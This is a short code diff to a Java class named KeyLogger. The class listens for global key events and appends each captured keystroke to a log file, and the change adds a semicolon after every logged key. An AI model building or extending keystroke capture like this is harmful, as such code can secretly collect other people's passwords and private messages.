@@ -57,9 +57,9 @@ public class KeyLogger implements NativeKeyListener {
 				StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
 			
 			if (keyText.length() > 1) {
-				writer.print("[" + keyText + "]");
+				writer.print("[" + keyText + "];");
 			} else {
-				writer.print(keyText);
+				writer.print(keyText + ";");
 			}
 			
 		} catch (IOException ex) {
